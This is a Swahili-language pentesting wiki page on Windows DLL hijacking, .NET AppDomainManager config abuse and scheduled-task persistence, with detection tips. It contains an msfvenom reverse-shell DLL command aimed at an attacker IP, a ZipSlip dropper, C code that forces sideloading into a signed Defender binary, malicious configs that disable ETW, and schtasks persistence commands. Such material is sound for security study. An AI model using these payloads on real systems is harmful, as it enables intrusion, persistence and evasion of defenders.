# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Maelezo ya Msingi

DLL Hijacking huhusisha kudanganya programu inayoaminika ili ipakie DLL hasidi. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, and Side-Loading**. Hutumika hasa kutekeleza code na kupata persistence, na mara chache zaidi, kupandisha privilege. Ingawa hapa lengo ni kupandisha privilege, mbinu ya hijacking hubaki ileile bila kujali lengo.

### Mbinu za Kawaida

Kuna mbinu kadhaa za DLL hijacking, na ufanisi wa kila moja hutegemea jinsi programu inavyopakia DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Kubadilisha DLL halisi na DLL hasidi, kwa hiari kutumia DLL Proxying ili kuhifadhi utendakazi wa DLL halisi.
2. **DLL Search Order Hijacking**: Kuweka DLL hasidi kwenye njia ya utafutaji iliyo mbele ya DLL halali, kwa kutumia mpangilio wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL hasidi ili programu ipakie ikidhani ni DLL inayohitajika lakini haipo.
4. **DLL Redirection**: Kurekebisha vigezo vya utafutaji kama `%PATH%` au faili za `.exe.manifest` / `.exe.local` ili kuelekeza programu kwenye DLL hasidi.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na DLL hasidi ndani ya saraka ya WinSxS; mbinu hii mara nyingi huhusishwa na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hasidi kwenye saraka inayodhibitiwa na mtumiaji pamoja na programu iliyonakiliwa, kwa namna inayofanana na mbinu za Binary Proxy Execution.

Programu inaweza pia kutekeleza **DLL loader yake yenyewe**. Mchakato wenye privilege unaweza kuorodhesha saraka ya mtoto kama `Libraries` au `Plugins` na kuipitishia helper DLL iliyochaguliwa, bila kutegemea mpangilio wa kawaida wa utafutaji wa DLL wa Windows. Ikiwa akaunti nyingine inaweza kuunda faili kwenye saraka hiyo mahususi, lichukulie hilo kama jambo la kufuatilia: thibitisha utambulisho wa mchakato, ACL inayotumika kwa saraka, kanuni ya kuchagua faili na operesheni ya kupakia inayoweza kufikiwa. Saraka inayoweza kuandikwa karibu na executable haithibitishi kuwa mchakato hupakia DLL kutoka humo.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}

### Post-installation PE import grafting

Side-loading ya kawaida huacha PE inayoaminika bila mabadiliko na hushinda utatuzi wa majina ya DLL. **Import grafting** badala yake hurekebisha PE ambayo tayari imepakiwa na programu inayoaminika. Mshambuliaji huongeza import descriptor na maingizo yanayohusiana ya lookup/IAT kwa DLL inayodhibitiwa na mshambuliaji. Windows inapotatua dependency hiyo kwa kujirudia, hupakia DLL iliyoongezwa na kuendesha initialization code yake ndani ya mchakato ambao vinginevyo ungekuwa halali. Huu ni urekebishaji wa PE iliyoko kwenye diski, si operesheni sawa na kubadilisha runtime hook ya function pointer ya IAT iliyo hai.<sup>[[31]](#references)[[32]](#references)</sup>

PE iliyorekebishwa inaweza kuwa DLL ya kati ya vendor badala ya executable inayoanzishwa na mtumiaji au Task Scheduler. Mfuatano unaoweza kutumika tena ni:<sup>[[32]](#references)</sup>

1. Nakili executable halali na dependencies zake kwenye saraka inayodhibitiwa na mshambuliaji.
2. Rekebisha import structures za dependency moja ili zirejelee DLL hasidi, huku ukihifadhi exports zinazotarajiwa za dependency na utendakazi wake wa kawaida.
3. Sanidi autorun au scheduled task ili ianzishe executable halali. Loader itapakia dependency iliyorekebishwa, kisha DLL iliyoingizwa hivi karibuni. Tazama [Privilege Escalation with Autoruns](../privilege-escalation-with-autorun-binaries.md#scheduled-tasks) kwa uorodheshaji wa tasks.
4. Epuka kuweka kazi nzito ndani ya `DllMain`; loader iliyoonekana iliunda worker thread na kuendelea na staged decryption humo.

Hii ni tofauti na uvamizi wa supply-chain wa upande wa vendor ikiwa package ya vendor ni safi na urekebishaji wa import unafanyika baada ya usakinishaji. Chunguza kila module kwenye saraka iliyowekwa kwa ajili ya staged execution, si host EXE pekee: linganisha orodha za import za dependencies na hashes zake na usakinishaji unaojulikana kuwa salama, thibitisha signatures, na chunguza vendor binaries zinazoanzishwa kutoka maeneo yasiyo ya kawaida yanayoweza kuandikwa kama `C:\ProgramData`. Scheduled task inayoelekeza kwenye crash reporter au updater iliyonakiliwa katika saraka kama hiyo ni sehemu muhimu ya kufuatilia.<sup>[[32]](#references)</sup>


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading si njia pekee ya kufanya mchakato unaoaminika wa **.NET Framework** upakie code ya mshambuliaji. Ikiwa executable lengwa ni programu ya **managed**, CLR pia hukagua **application configuration file** yenye jina la executable (kwa mfano `Setup.exe.config`). Faili hiyo inaweza kufafanua **AppDomainManager** maalum. Ikiwa config inaelekeza kwenye assembly inayodhibitiwa na mshambuliaji iliyo karibu na EXE, CLR huipakia **kabla ya njia ya kawaida ya code ya programu** na kuiendesha ndani ya mchakato unaoaminika.<sup>[[24]](#references)</sup>

Kulingana na schema ya usanidi wa .NET Framework ya Microsoft, `<appDomainManagerAssembly>` na `<appDomainManagerType>` lazima zote ziwepo ili manager maalum itumike.<sup>[[16]](#references)[[17]](#references)</sup>

Config ndogo zaidi:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Kidhibiti kidogo:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Vidokezo vya vitendo:
- Hii ni mbinu mahususi kwa **.NET Framework**. Inategemea uchanganuzi wa usanidi wa CLR, si mpangilio wa utafutaji wa Win32 DLL.
- Host lazima iwe **managed EXE** kweli. Ukaguzi wa haraka: `sigcheck -m target.exe`, `corflags target.exe`, au angalia **CLR Runtime Header** kwenye metadata ya PE.
- Jina la faili ya usanidi lazima lilingane kabisa na jina la executable (`<binary>.config`), na kwa kawaida huwa **karibu na EXE**.
- Hii ni muhimu kwa kutumia **signed Microsoft/vendor binaries** kwa sababu EXE inayoaminika hubaki bila kuguswa huku malicious managed assembly ikitekelezwa ndani ya mchakato huo.
- Ikiwa tayari una saraka ya installer/update inayoweza kuandikwa, AppDomainManager hijacking inaweza kutumika kama **hatua ya kwanza**, ikifuatiwa na DLL sideloading ya kawaida au reflective loading kwa hatua zinazofuata.

### Aina ya AppDomainManager iliyosainiwa kama kifaa cha faili ya usanidi

AppDomainManager config hijack ya kawaida iliyoelezwa hapo juu huelekeza kwenye attacker assembly. Njia nyingine ya .NET Framework hutumia **signed assembly**, iliyowekwa pamoja na host au inayoweza kutatuliwa kwa njia nyingine, ambayo aina yake ya manager husoma data ya pembeni inayodhibitiwa na mshambuliaji. Mshambuliaji bado anahitaji kudhibiti `.exe.config` iliyo karibu na managed host pamoja na faili za ziada; saini kwenye assembly iliyochaguliwa haifanyi ingizo lake la usanidi kuwa salama. Mbinu ya usanidi ni tabia ya kawaida ya AppDomainManager, ilhali mfuatano wa signed-type ulioelezwa hapa chini ulionekana katika uchanganuzi wa NetamLoader.<sup>[[16]](#references)[[17]](#references)[[35]](#references)</sup>

Katika mfuatano huo, usanidi huchagua `Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration` kutoka `Microsoft.HostIntegration.Connectors`. Wakati wa uanzishaji, aina hii hutafuta `fabric.config` katika saraka ya programu. Ingizo la `customType` hutaja `System.Resources.ResXResourceSet` na kutoa `Resources.resx` kama hoja ya constructor yake, na hivyo kufikia kichanganuzi cha rasilimali bila kusambaza attacker-built manager DLL. Hili linahitaji signed assembly inayohusiana na AppFabric pamoja na madarasa ya framework yaliyotajwa yaweze kutatuliwa kwenye target; si sifa ya kila managed EXE.<sup>[[35]](#references)</sup> AppDomainManager iliyosanidiwa pia huhitaji programu ya full-trust; la sivyo CLR hutupa `TypeLoadException`.<sup>[[16]](#references)[[17]](#references)</sup>

```xml
<!-- in <host>.exe.config -->
<configuration>
  <runtime>
    <appDomainManagerType value="Microsoft.ApplicationServer.Caching.DataCacheFactoryConfiguration" />
    <appDomainManagerAssembly value="Microsoft.HostIntegration.Connectors, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" />
  </runtime>
</configuration>
```

```xml
<!-- adjacent fabric.config -->
<section name="foo">
  <customType className="System.Resources.ResXResourceSet, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089(Resources.resx)" />
</section>
```

Maudhui ya `Resources.resx` ndiyo deserialization sink, si faili la data tu; tazama [RESX to BinaryFormatter and XAML](../../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml). Katika hatua iliyoripotiwa, XAML loader pia ilitoa AES key yake kutoka kwa SHA-256 hash ya **command line kamili ya host iliyoandikwa kwa herufi ndogo** na kutumia bytes 16 za kwanza za blob iliyodecoded kama IV yake. Kwa hivyo, kucheza tena faili hizo kwa command line tofauti husababisha decryption kushindwa kabla ya XAML inayofuata kupakiwa.<sup>[[35]](#references)</sup>

### AppDomainManager kama downloader + scheduled-task bootstrap

Mbinu ya kawaida ya intrusion ni kuoanisha managed EXE inayoaminika na `*.config` hasidi pamoja na AppDomainManager DLL hasidi inayofanya kazi kama **bootstrapper ndogo**:<sup>[[25]](#references)</sup>

1. Mtumiaji huzindua .NET installer au updater iliyosainiwa kutoka mahali panapoaminika, kama vile `%USERPROFILE%\Downloads`.
2. Config iliyo karibu husababisha CLR kupakia attacker assembly **kabla** ya mantiki halali ya app kuanza.
3. Manager hasidi hutekeleza **path gate** (kwa mfano, kuendelea tu ikiwa host EXE inaendeshwa kutoka `Downloads`, na kuruhusu hatua ya pili iendeshwe tu kutoka `%LOCALAPPDATA%`).
4. Ikiwa ukaguzi utafaulu, hupakua payload halisi hadi kwenye njia inayoweza kuandikiwa na mtumiaji kama `%LOCALAPPDATA%\PerfWatson2.exe` na kuweka persistence kwa kutumia scheduled task.

Kwa nini mbinu hii ni muhimu:
- Host EXE iliyosainiwa hubaki bila kubadilishwa, kwa hivyo triage inayokagua hash ya binary kuu pekee inaweza kukosa compromise.
- **Path-based anti-analysis** rahisi ni ya kawaida: kuhamisha ZIP/EXE/DLL triad hadi Desktop, Temp, au njia ya sandbox kunaweza kuvunja mnyororo kimakusudi.
- AppDomainManager DLL ya hatua ya kwanza inaweza kubaki ndogo na yenye kelele kidogo huku implant halisi ikipakuliwa baadaye.

Mfano mdogo wa persistence unaoonekana mara nyingi katika mbinu hii:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes:
- ` /rl highest` inamaanisha **kiwango cha juu zaidi kinachopatikana** kwa mtumiaji/session hiyo; si hakikisho la kupandishwa kwa SYSTEM lenyewe.
- Mbinu hii mara nyingi huainishwa vyema zaidi kama **execution/persistence via .NET config abuse** kuliko classic missing-DLL search-order hijacking, ingawa waendeshaji mara nyingi huunganisha mbinu hizi mbili.

Viashiria vya kugundua:
- .NET executables zilizotiwa sahihi zinazoendeshwa kutoka **ZIP extraction paths**, `Downloads`, `%TEMP%`, au folda nyingine zinazoweza kuandikiwa na mtumiaji, zikiwa na `<exe>.config` **iliyowekwa pamoja nazo**.
- Scheduled tasks mpya ambazo action yake inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au `Downloads`, na ambazo majina yake yanafanana na yale ya browser/vendor updaters.
- Managed bootstrap processes za muda mfupi ambazo hupakua EXE nyingine mara moja, kisha kuwasha `schtasks.exe`.
- Samples zinazotoka mapema isipokuwa path ya executable ilingane na user-profile directory inayotarajiwa.

### Kuhijack scheduled task iliyopo ili kuanzisha tena sideload chain

Kwa persistence, usitafute tu **kuunda task mpya**. Baadhi ya makundi ya wavamizi husubiri installer halali iunde **updater task ya kawaida**, kisha **hubadilisha task action** ili jina, author, na trigger zilizopo ziendelee kuonekana kuwa za kawaida kwa watetezi.

Workflow inayoweza kutumiwa tena:
1. Sakinisha/endesha software halali na utambue task ambayo kwa kawaida huunda.
2. Hamisha task XML na uandike thamani za sasa za `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Badilisha action pekee ili task ianzishe **trusted host EXE** yako kutoka user-writable staging directory, kisha EXE hiyo side-load au AppDomain-load payload halisi.
4. Sajili upya task kwa jina lilelile badala ya kuunda persistence artifact mpya inayoonekana wazi.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Kwa nini ni vigumu zaidi kugundua:
- Jina la task bado linaweza kuonekana halali (kwa mfano, updater ya vendor).
- Huduma ya **Task Scheduler** ndiyo huizindua, kwa hivyo uthibitishaji wa parent/ancestor mara nyingi huona mnyororo wa kawaida wa scheduling badala ya `explorer.exe`.
- Timu za DFIR zinazotafuta **majina mapya ya task** pekee zinaweza kukosa task ambayo usajili wake ulikuwepo tayari, lakini action yake sasa inaelekeza kwenye `%LOCALAPPDATA%`, `%APPDATA%`, au njia nyingine inayodhibitiwa na mshambuliaji.

Njia za haraka za uchunguzi:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Linganisha XML za `C:\Windows\System32\Tasks\*` na metadata ya `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` dhidi ya baseline.
- Weka alert task ya updater **inayoonekana kuwa ya vendor** inapoendeshwa kutoka **directories zinazoweza kuandikiwa na mtumiaji** au inapozindua .NET EXE yenye faili `*.config` iliyo pamoja nayo.

> [!TIP]
> Kwa mnyororo wa hatua kwa hatua unaounganisha HTML staging, AES-CTR configs, na .NET implants pamoja na DLL sideloading, kagua workflow iliyo hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

### Kuunganisha stage iliyopakiwa pembeni na command line ya huduma

DLL iliyopakiwa pembeni inaweza kuhitaji zaidi ya host EXE na jina la DLL linalotarajiwa. Mandiant ilieleza loader inayounganisha usimbuaji fiche wa payload na command-line argument pamoja na jina la executable ya host.<sup>[[33]](#references)</sup> Katika mnyororo wa baadaye unaotegemea service, host halali iliyonakiliwa ilipakia `mscoree.dll` iliyo karibu nayo, ambayo ilisafirisha `LockClrVersion` na kusimbua stage yake iliyopachikwa baada tu ya kupata AES-128 key kutoka kwa argument ya service na basename ya executable ya host. Kila ingizo lilipunguzwa au kujazwa NUL hadi byte 16; key ya bytewise ilikuwa `argument XOR embedded_key XOR executable_basename`, kisha payload ilisimbuliwa kwa AES-CBC bila padding. Kubadilisha jina la host au kuizindua bila argument inayotarajiwa hubadilisha key na kuzuia stage hii kusimbuliwa, hata kama DLL bado inapakiwa. Hifadhi command-line argument na basename halisi unapounda upya au kuchanganua variant hii.<sup>[[34]](#references)</sup>

Hii ni **kizuizi cha payload kilichowekwa juu ya DLL side-loading ya kawaida**, si kanuni mpya ya mpangilio wa utafutaji wa DLL wala primitive ya privilege escalation yenyewe. Security context ya service ndiyo huamua kiwango cha privilege kinachopatikana. Workflow ya [GitHub issue/file C2](../../../generic-methodologies-and-resources/github-issues-and-repository-files-c2.md) inaeleza usafirishaji wa baadaye kando.<sup>[[34]](#references)</sup>

## Kutafuta DLL zinazokosekana

Njia inayotumika zaidi kutafuta DLL zinazokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **ukiweka** **filters 2 zifuatazo**:

![Mbinu za Kawaida - Kutafuta DLL zinazokosekana: Njia inayotumika zaidi kutafuta DLL zinazokosekana ndani ya mfumo ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (961).png>)

![Mbinu za Kawaida - Kutafuta DLL zinazokosekana: Njia inayotumika zaidi kutafuta DLL zinazokosekana ndani ya mfumo ni kuendesha procmon kutoka sysinternals, ukiweka filters 2 zifuatazo](<../../../images/image (230).png>)

kisha uonyeshe **File System Activity** pekee:

![Mbinu za Kawaida - Kutafuta DLL zinazokosekana: kisha uonyeshe File System Activity pekee](<../../../images/image (153).png>)

Ikiwa unatafuta **DLL zinazokosekana kwa ujumla**, **iache** ikiendelea kwa **sekunde** kadhaa.\
Ikiwa unatafuta **DLL inayokosekana ndani ya executable maalum**, weka filter nyingine kama **"Process Name" "contains" `<exec name>`**, iendeshe, kisha usimamishe kunasa matukio.<sup>[[9]](#references)</sup>

## Kutumia DLL zinazokosekana kwa mashambulizi

Ili kuongeza privilege, tafuta **DLL ambayo mchakato wenye privilege hujaribu kuipakia** kutoka eneo unaloweza kuandikia. Hili linaweza kutokea unapodhibiti directory inayotafutwa kabla ya directory iliyo na DLL halali, au pale DLL inayoombwa haipo na unaweza kuandikia mojawapo ya directories zinazotafutwa.

### Mpangilio wa utafutaji wa DLL

**Ndani ya** [**nyaraka za Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **unaweza kuona jinsi DLL zinavyopakiwa hasa.**

**Programu za Windows** hutafuta DLL kwa kufuata seti ya **njia za utafutaji zilizobainishwa awali**, kwa mfuatano maalum. Tatizo la DLL hijacking hutokea DLL hasidi inapowekwa kimkakati katika mojawapo ya directories hizi, ili ipakiwe kabla ya DLL halisi. Njia moja ya kuzuia hili ni kuhakikisha programu inatumia absolute paths inaporejelea DLL inayohitaji.

Unaweza kuona **mpangilio wa utafutaji wa DLL kwenye** mifumo ya **32-bit** hapa chini:

1. Directory ambayo programu ilipakiwa kutoka.
2. Directory ya mfumo. Tumia function ya [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) kupata njia ya directory hii.(_C:\Windows\System32_)
3. Directory ya mfumo ya 16-bit. Hakuna function inayopata njia ya directory hii, lakini hutafutwa. (_C:\Windows\System_)
4. Directory ya Windows. Tumia function ya [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) kupata njia ya directory hii.
   1. (_C:\Windows_)
5. Directory ya sasa.
6. Directories zilizoorodheshwa katika environment variable ya PATH. Kumbuka kuwa hii haijumuishi njia ya kila programu iliyoainishwa na registry key ya **App Paths**. Key ya **App Paths** haitumiki wakati wa kukokotoa njia ya utafutaji wa DLL.

Huu ndio mpangilio wa utafutaji wa **chaguo-msingi** wakati **SafeDllSearchMode** imewashwa. Ikiwa imezimwa, directory ya sasa hupanda hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza registry value ya **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kuwa 0 (chaguo-msingi ni kuwashwa).

Ikiwa function ya [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) itaitwa kwa **LOAD_WITH_ALTERED_SEARCH_PATH**, utafutaji huanza kwenye directory ya executable module ambayo **LoadLibraryEx** inaipakia.

Hatimaye, DLL inaweza kupakiwa kwa absolute path badala ya jina. Katika hali hiyo, Windows hutafuta DLL yenyewe kwenye njia hiyo pekee; dependencies zinazoombwa kwa jina bado hufuata mpangilio wa utafutaji unaotumika.

Kuna njia nyingine za kubadilisha mpangilio wa utafutaji, lakini sitazieleza hapa.

### Kuunganisha uandishi holela wa faili na utekaji wa DLL inayokosekana

**Mbinu inayohusiana:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Tumia filters za **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) kukusanya majina ya DLL ambayo mchakato huyachunguza lakini hauwezi kuyapata.<sup>[[14]](#references)</sup>
2. Ikiwa binary inaendeshwa kwa **ratiba/na service**, kuweka DLL yenye mojawapo ya majina hayo kwenye **application directory** (kipengee cha #1 kwenye mpangilio wa utafutaji) kutasababisha ipakiwe mara itakapoendeshwa tena. Katika kisa kimoja cha .NET scanner, mchakato ulitafuta `hostfxr.dll` kwenye `C:\samples\app\` kabla ya kupakia nakala halisi kutoka `C:\Program Files\dotnet\fxr\...`.
3. Tengeneza DLL ya payload (kwa mfano, reverse shell) yenye export yoyote: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Ikiwa primitive yako ni **uandishi holela wa faili wa aina ya ZipSlip**, tengeneza ZIP yenye entry inayotoka nje ya extraction dir ili DLL iwekwe kwenye app folder:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Peleka archive kwenye inbox/share inayofuatiliwa; task iliyoratibiwa itakapozindua upya process, process hiyo itapakia DLL hasidi na kutekeleza code yako kama akaunti ya service.

### Kulazimisha sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath

Njia ya hali ya juu ya kudhibiti kwa uhakika njia ya utafutaji wa DLL ya process mpya ni kuweka sehemu ya DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda process kwa kutumia native APIs za ntdll. Kwa kutoa directory inayodhibitiwa na mshambulizi hapa, process lengwa inayotafuta DLL iliyoagizwa kwa jina (bila absolute path na bila kutumia safe loading flags) inaweza kulazimishwa kupakia DLL hasidi kutoka kwenye directory hiyo.

Wazo kuu
- Unda process parameters kwa RtlCreateProcessParametersEx na utoe DllPath maalum inayoelekeza kwenye folder unayodhibiti (kwa mfano, directory ilipo dropper/unpacker yako).
- Unda process kwa RtlCreateUserProcess. Binary lengwa inapotafuta DLL kwa jina, loader itatumia DllPath hii iliyotolewa wakati wa utafutaji, hivyo kuwezesha sideloading ya kuaminika hata pale DLL hasidi haipo pamoja na target EXE.

Vidokezo/vikwazo
- Hili huathiri child process inayoundwa; ni tofauti na SetDllDirectory, inayoathiri process ya sasa pekee.
- Target lazima iagize au ipakie DLL kwa jina (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na absolute paths zilizowekwa moja kwa moja haziwezi kutekwa. Forwarded exports na SxS zinaweza kubadilisha mpangilio wa kipaumbele.

Mfano mdogo wa C (ntdll, wide strings, ushughulikiaji wa makosa uliorahisishwa):

<details>
<summary>Mfano kamili wa C: kulazimisha DLL sideloading kupitia RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

Mfano wa matumizi ya kiutendaji
- Weka xmllite.dll hasidi (inayosafirisha functions zinazohitajika au kufanya proxy kwa ile halisi) kwenye directory yako ya DllPath.
- Endesha binary iliyosainiwa ambayo inajulikana kutafuta xmllite.dll kwa jina kwa kutumia mbinu iliyo hapo juu. Loader hutatua import kupitia DllPath iliyotolewa na kufanya sideload ya DLL yako.

Mbinu hii imeonekana ikitumika kwenye mazingira halisi kuendesha minyororo ya sideloading ya hatua nyingi: launcher ya awali huweka helper DLL, ambayo kisha huzindua binary iliyosainiwa na Microsoft inayoweza kuhijackiwa, ikiwa na DllPath maalum ili kulazimisha kupakia DLL ya mshambuliaji kutoka kwenye staging directory.<sup>[[6]](#references)</sup>


### Utekaji wa .NET AppDomainManager kupitia `.exe.config`

Kwa targets za **.NET Framework**, sideloading inaweza kufanyika **kabla ya `Main()`** bila kurekebisha memory, kwa kutumia vibaya faili ya **`.exe.config`** iliyo karibu na programu. Badala ya kutegemea tu mpangilio wa utafutaji wa Win32 DLL, mshambuliaji huweka EXE halali ya .NET karibu na config hasidi na assembly moja au zaidi zinazodhibitiwa na mshambuliaji.

Jinsi mnyororo huu unavyofanya kazi:<sup>[[15]](#references)[[22]](#references)</sup>
1. EXE ya host huanza na **CLR husoma `<exe>.config`**.
2. Config huweka **`<appDomainManagerAssembly>`** na **`<appDomainManagerType>`** ili runtime ianzishe `AppDomainManager` inayodhibitiwa na mshambuliaji.
3. Manager hasidi hupata **utekelezaji kabla ya `Main()`** ndani ya process ya host inayoaminika.
4. Config hiyo hiyo inaweza kulazimisha CLR kutafuta assembly za ndani kwanza (kwa mfano `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) na inaweza kudhoofisha uthibitishaji/telemetry ya runtime bila kufanya inline patching.

Muundo wa mtindo wa kampeni (upangaji halisi unaweza kutofautiana kulingana na directive / toleo la CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Kwa nini hii ni muhimu:
- **`<probing privatePath="."/>`** huweka assembly resolution ndani ya saraka ya programu, na kuifanya folda hiyo kuwa eneo linalotabirika la sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** huhamishia utekelezaji kwenye code ya mshambuliaji wakati wa uanzishaji wa CLR, kabla mantiki halali ya programu haijaanza kufanya kazi.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** inaweza kuruhusu programu ya full-trust kupakia assemblies zisizosainiwa au zilizobadilishwa bila hitilafu ya uthibitishaji wa strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** huzuia publisher-policy kuelekeza upya kwenye assemblies mpya zaidi.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** hufanya uteuzi wa runtime utabirike zaidi.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** inavutia hasa kwa sababu **CLR huzima mwonekano wake yenyewe wa ETW** kupitia configuration, badala ya implant kurekebisha `EtwEventWrite` kwenye memory.

Mfumo wa utekelezaji ulioonekana kwenye kampeni za hivi karibuni:
- Hatua ya 1 huweka `setup.exe`, `setup.exe.config`, na assemblies za ndani.
- Hatua ya 2 huzinakili kwenye folda ya kuaminika ya **AppData update**, hubadilisha jina la host kuwa kitu kama `update.exe`, kisha huiwasha tena kupitia **scheduled task**.
